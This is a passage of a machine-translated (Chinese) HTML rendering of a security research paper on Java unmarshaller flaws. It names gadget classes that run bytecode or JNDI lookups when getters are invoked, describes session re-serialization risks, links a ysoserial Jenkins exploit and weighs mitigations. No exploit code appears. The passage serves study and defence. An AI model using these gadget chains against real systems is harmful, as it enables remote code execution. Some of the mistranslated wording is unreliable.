<div style="position:absolute;top:35172;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">66</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果没有另外配置</font></font></font></nobr></div>
<div style="position:absolute;top:35186;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">67</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请参阅已发布的 Jenkins CVE-2016-0788 漏洞利用，了解其工作原理 – </font></font></font><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JenkinsListener.java"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://github </font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JenkinsListener.java"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JenkinsListener.java"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/</font></font></a></font></nobr></div>
</span></font>
<font size="2" color="#0000cc" face="Times"><span style="font-size:9px;font-family:Times;color:#0000cc">
<div style="position:absolute;top:35204;left:186"><nobr><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JenkinsListener.java"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JenkinsListener </font></font></a><i><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JenkinsListener.java"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></i><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JenkinsListener.java"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">爪哇</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:35263;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">28</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:35511;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="29"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 29 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:19px;font-family:Times">
<div style="position:absolute;top:35669;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5 进一步互动</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:35711;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到目前为止，我们只关注解组过程中发生的事情，其中</font></font></nobr></div>
<div style="position:absolute;top:35729;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">意味着在控制流返回到用户应用程序之前。</font><font style="vertical-align: inherit;">但是你为什么要</font></font></nobr></div>
<div style="position:absolute;top:35747;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;" class="">如果您之后不打算使用数据，则完全解组。</font><font style="vertical-align: inherit;">假设</font></font></nobr></div>
<div style="position:absolute;top:35765;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解组对象图通过潜在的类型检查和其他验证，有</font></font></nobr></div>
<div style="position:absolute;top:35782;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也为之后发生的漏洞利用提供了空间。</font><font style="vertical-align: inherit;">一个明显的例子是如果</font></font></nobr></div>
<div style="position:absolute;top:35800;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序直接调用一些方法，导致不必要的副作用基于</font></font></nobr></div>
<div style="position:absolute;top:35818;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者提供的对象的（意外）状态。</font><font style="vertical-align: inherit;">注入代理的能力可能会中断</font></font></nobr></div>
<div style="position:absolute;top:35836;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几乎所有关于对象行为的假设。</font><font style="vertical-align: inherit;">有一对</font></font></nobr></div>
<div style="position:absolute;top:35854;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不需要应用程序直接与应用程序交互的更一般的场景</font></font></nobr></div>
<div style="position:absolute;top:35872;left:165"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“坏”型。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:35916;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.1 编组 Getter 调用</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:35950;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于属性的编组器将调用包含在</font></font></nobr></div>
<div style="position:absolute;top:35968;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图形。</font><font style="vertical-align: inherit;">因此，如果先前未编组的对象（不一定使用相同的</font></font></nobr></div>
<div style="position:absolute;top:35986;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机制）最终传递给这样一个机制进行编组，一个全新的</font></font></nobr></div>
<div style="position:absolute;top:36004;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将在攻击者控制的对象上调用一系列方法。</font></font></nobr></div>
<div style="position:absolute;top:36027;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果使用入站机制可以充分恢复各自的类型，则它们</font></font></nobr></div>
<div style="position:absolute;top:36045;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将对基于属性的编组触发不良影响，例如：</font></font></nobr></div>
<div style="position:absolute;top:36066;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• Xalan 的 TemplatesImpl 在 getOutputProperties() 上执行提供的字节码。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">68</font></font></font></nobr></div>
<div style="position:absolute;top:36089;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• com.sun.rowset.JdbcRowSetImpl 将对 getDatabase 执行 JNDI 查找</font></font></nobr></div>
<div style="position:absolute;top:36109;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">元数据（）。</font></font></nobr></div>
<div style="position:absolute;top:36129;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• org.apache.xalan.lib.sql.JNDIConnectionPool 将执行 JNDI 查找</font></font></nobr></div>
<div style="position:absolute;top:36148;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 getConnection() 上。</font></font></nobr></div>
<div style="position:absolute;top:36169;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• java.security.SignedObject：将触发所提供数据的 Java 反序列化</font></font></nobr></div>
<div style="position:absolute;top:36188;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 getObject() 上。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:36232;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.2 Java“重新”序列化</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:36266;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在大多数 servlet 容器的 servlet 会话中存储对象图将触发</font></font></nobr></div>
<div style="position:absolute;top:36284;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话被分页时的序列化和分页时的反序列化</font></font></nobr></div>
<div style="position:absolute;top:36302;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">in. 还有各种原语可以使用 Java 克隆对象图</font></font></nobr></div>
<div style="position:absolute;top:36320;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">序列化。</font><font style="vertical-align: inherit;">这也可以打开否则不会的利用载体</font></font></nobr></div>
<div style="position:absolute;top:36338;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可达。</font><font style="vertical-align: inherit;">这种行为的一个例子是 spring-tx 的 JtaTransactionManager。</font></font></nobr></div>
<div style="position:absolute;top:36356;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以使用所有描述的机制很好地设置该类。</font><font style="vertical-align: inherit;">几乎没有</font></font></nobr></div>
<div style="position:absolute;top:36374;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，它们将触发利用所需的初始化代码</font></font></nobr></div>
<div style="position:absolute;top:36392;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是在 afterPropertiesSet() 或 readObject() 中完成的。</font><font style="vertical-align: inherit;">但是，此代码可能</font></font></nobr></div>
<div style="position:absolute;top:36410;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">突然被触发，如果攻击者制作的对象存储在会话中或被克隆</font></font></nobr></div>
<div style="position:absolute;top:36428;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用序列化。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:36484;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">68</font><font style="font-size:9px"><font style="vertical-align: inherit;">适用</font></font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">于</font></font></font><font color="#800000" style="font-size:9px"><a href="https://translate.googleusercontent.com/translate_f#16"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.1 中</font></font></a></font><font style="vertical-align: inherit;"><font style="font-size:9px"><font style="vertical-align: inherit;">提到的关于其瞬态字段的限制</font></font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，所需的设置器也是</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:36500;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不公开</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:36525;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">29</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:36773;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="30"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 30 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:19px;font-family:Times">
<div style="position:absolute;top:36931;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6。结论</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:36972;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好消息是，这些机制或多或少很明显——通过传输 Java</font></font></nobr></div>
<div style="position:absolute;top:36990;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型信息——公开实现细节，因此并不真正适合</font></font></nobr></div>
<div style="position:absolute;top:37008;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于公共 API，并且很少用于这些 API。</font><font style="vertical-align: inherit;">一些描述的编组器是</font></font></nobr></div>
<div style="position:absolute;top:37026;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相当晦涩，有些似乎被遗弃了，但几乎所有的可利用用途都可以</font></font></nobr></div>
<div style="position:absolute;top:37044;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在重大项目中发现，在许多情况下会导致严重的漏洞。</font></font></nobr></div>
<div style="position:absolute;top:37066;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个问题仅限于Java吗？</font><font style="vertical-align: inherit;">肯定不是。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">69</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Java 的扁平类路径架构</font></font></nobr></div>
<div style="position:absolute;top:37084;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ture </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">70</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和普通类路径的绝对大小，包括但不限于标准</font></font></nobr></div>
<div style="position:absolute;top:37101;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">库，只是提供了很多可供利用的表面。</font><font style="vertical-align: inherit;">“企业”的可用性</font></font></nobr></div>
<div style="position:absolute;top:37119;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准库中的特性 (JNDI) 提供远程代码执行功能</font></font></nobr></div>
<div style="position:absolute;top:37137;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过看似无害的 API 来完成剩下的工作。</font><font style="vertical-align: inherit;">这里展示的许多小工具都依赖于</font></font></nobr></div>
<div style="position:absolute;top:37155;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 JNDI 上用于远程代码执行步骤。</font><font style="vertical-align: inherit;">JNDI/RMI 已经被强化</font></font></nobr></div>
<div style="position:absolute;top:37173;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下不允许远程代码库，作者希望 JNDI/LDAP 遵循</font></font></nobr></div>
<div style="position:absolute;top:37191;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">很快的某个时候。</font><font style="vertical-align: inherit;">但是，这不会解决实际问题，即此代码已到达-</font></font></nobr></div>
<div style="position:absolute;top:37209;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先能够，并且仍然允许升级到</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java序列化（3.2.1）</font></font></a></font></nobr></div>
<div style="position:absolute;top:37227;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可能比主要机制更具表现力/可利用性。</font></font></nobr></div>
<div style="position:absolute;top:37249;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当比较这里介绍的不同机制时，很明显，虽然</font></font></nobr></div>
<div style="position:absolute;top:37267;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现场和基于财产的编组器的小工具之间没有太多重叠，</font></font></nobr></div>
<div style="position:absolute;top:37285;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">两者都可以同等地被利用，它们的脆弱程度主要取决于</font></font></nobr></div>
<div style="position:absolute;top:37303;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用于漏洞利用的类型数量。</font><font style="vertical-align: inherit;">对这些的限制可能会到来</font></font></nobr></div>
<div style="position:absolute;top:37321;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自技术要求，例如可见性约束或构造函数要求，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">71</font></font></font></nobr></div>
<div style="position:absolute;top:37338;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行时类型信息的使用，在某些情况下，由</font></font></nobr></div>
<div style="position:absolute;top:37356;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标对象。</font><font style="vertical-align: inherit;">除了</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hessian/Burlap (3.2.3) 中</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的错误实现</font></font><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font></a> <font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java</font></font></a></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:37374;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">序列化（3.2.1）</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">似乎真的是检查这种意图的唯一机制</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:37392;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以 java.io.Serializable 的形式。</font></font></nobr></div>
<div style="position:absolute;top:37414;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然允许类型声明它们是否应该是一个好主意</font></font></nobr></div>
<div style="position:absolute;top:37432;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许（取消）编组，并取消任何此类限制 - 作为大多数机制</font></font></nobr></div>
<div style="position:absolute;top:37450;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这里描述的做 - 更糟糕的是，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">72</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经看到了这个可怕的错误</font></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:37468;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java 序列化 (3.2.1)</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#11"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">导致此失败的原因有多种，其中一个是 java.io。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:37487;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Serializable 服务于两个具有冲突需求的目的。</font><font style="vertical-align: inherit;">用于钝化，例如</font></font></nobr></div>
<div style="position:absolute;top:37504;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在网络会话中存储一些对象，想要像这样透明地恢复事物</font></font></nobr></div>
<div style="position:absolute;top:37522;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能，而在数据传输中的使用应尽量减少副作用。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">73</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一个问题</font></font></nobr></div>
<div style="position:absolute;top:37540;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">源于这个意图是通过接口声明的，因此</font></font></nobr></div>
<div style="position:absolute;top:37558;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继承，强制对所有子类型进行声明。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第74</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">话</font></font></nobr></div>
<div style="position:absolute;top:37575;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">决定某事对可能看不到的人来说是否总体上是安全的</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:37600;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">69</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如 </font><font style="vertical-align: inherit;">Json.NET 多态 TypeNameHandling 似乎是执行类似操作的主要目标</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:37617;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C# 中的东西——文档中有一个警告不要粗心地使用它，但像往常一样，</font></font></nobr></div>
<div style="position:absolute;top:37631;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几乎没有人关心。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:37643;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">70 种</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块化技术，如 OSGI、JBoss/Wildfly 模块和即将推出的 Java 9 模块</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:37659;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过隐式限制</font></font></nobr></div>
<div style="position:absolute;top:37674;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可访问类型相当显着，但也不是灵丹妙药</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:37686;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">71</font></font><a href="https://translate.googleusercontent.com/translate_f#12"></a><font color="#800000" style="font-size:9px"><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kryo (3.2.2)</font></font></a></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">很好地展示了默认构造函数要求可以产生多大的不同</font></font></font></nobr></div>
<div style="position:absolute;top:37700;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">72</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为即使人们考虑某些代码的影响也不能阻止它被使用</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:37716;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:37728;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">73</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个例子是 commons-fileupload 的 DiskFileItem</font></font></font></nobr></div>
<div style="position:absolute;top:37742;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">74 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Groovy 的 MethodClosure 可以被视为一个例子</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:37787;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">30</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:38035;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="31"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 31 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:38198;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完整的画面——在一个代码库中看似安全的东西突然可以通过</font></font></nobr></div>
<div style="position:absolute;top:38215;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复杂的交互，在另一个中变得可利用。</font><font style="vertical-align: inherit;">拿出一套干净的</font></font></nobr></div>
<div style="position:absolute;top:38233;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">规定什么可能是安全的行为，什么可能不像听起来那么容易。</font></font></nobr></div>
<div style="position:absolute;top:38256;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了人们实际上会使用具有不良行为的类的情况外，</font></font></nobr></div>
<div style="position:absolute;top:38274;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对根类型的字段/属性/集合进行全类型检查是非常有效的</font></font></nobr></div>
<div style="position:absolute;top:38292;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓解这些问题，但在许多情况下需要更改架构</font></font></nobr></div>
<div style="position:absolute;top:38310;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到用户软件</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">75</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且不能完全解释多态性。</font><font style="vertical-align: inherit;">结合这个</font></font></nobr></div>
<div style="position:absolute;top:38328;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多态类型的注册，例如 GSON 或 Jackson with Id.NAME</font></font></nobr></div>
<div style="position:absolute;top:38345;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多态性确实如此，对许多人来说似乎是安全性和便利性之间的良好平衡</font></font></nobr></div>
<div style="position:absolute;top:38363;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用例。</font></font></nobr></div>
<div style="position:absolute;top:38386;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">人们倾向于寻找可以指责的人。</font><font style="vertical-align: inherit;">应该是 hashCode()/equals() 还是</font></font></nobr></div>
<div style="position:absolute;top:38404;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性访问器实现调用任何可能产生副作用的代码？</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">76</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然</font></font></nobr></div>
<div style="position:absolute;top:38422;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总的来说，这可能是不好的风格，可能有必要在</font></font></nobr></div>
<div style="position:absolute;top:38440;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他。</font><font style="vertical-align: inherit;">解组器是否应该假设所有类型都遵循某种隐式约定？</font></font></nobr></div>
<div style="position:absolute;top:38458;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能不会，但没有任何形式的合同，他们无能为力。</font></font></nobr></div>
<div style="position:absolute;top:38475;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发人员是否应该更关注技术的安全影响</font></font></nobr></div>
<div style="position:absolute;top:38493;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们使用，包括实际阅读文档中的警告，而不是使用他们的</font></font></nobr></div>
<div style="position:absolute;top:38511;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方便？</font><font style="vertical-align: inherit;">当然。</font></font></nobr></div>
<div style="position:absolute;top:38534;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java 序列化 (3.2.1)，</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经看到了一些库，即 commons-collections</font></font></nobr></div>
<div style="position:absolute;top:38552;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 groovy，在他们的代码中“修复”小工具。</font><font style="vertical-align: inherit;">作者认为这是一个坏的</font></font></nobr></div>
<div style="position:absolute;top:38570;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择，留下许多可利用的实例作为基本问题通常仍然存在</font></font></nobr></div>
<div style="position:absolute;top:38588;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未固定。</font><font style="vertical-align: inherit;">此外，在许多情况下，甚至不可能为以下目的实施此类缓解措施：</font></font></nobr></div>
<div style="position:absolute;top:38605;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本文中描述的机制，因为类型无法阻止其自身</font></font></nobr></div>
<div style="position:absolute;top:38623;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解组。</font></font></nobr></div>
<div style="position:absolute;top:38646;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">人们应该带走的是，解组成对象总是</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">77</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一种形式</font></font></nobr></div>
